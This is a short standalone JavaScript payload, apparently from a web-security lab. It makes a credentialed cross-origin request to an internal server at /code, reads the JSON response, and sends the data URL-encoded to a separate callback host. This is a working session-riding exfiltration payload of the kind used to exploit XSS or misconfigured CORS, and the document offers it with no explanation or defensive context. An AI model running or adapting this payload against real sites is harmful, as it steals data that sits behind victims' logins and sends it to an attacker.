        fetch("https://192.168.206.101/code",{
                mode:"cors",
                method:"get",
                credentials:"include"
        })
        .then(response => response.json())
        .then(data => {
                fetch("http://192.168.45.206/callback?" + encodeURIComponent(JSON.stringify(data)), {
                        mode: "no-cors"
                })
        })
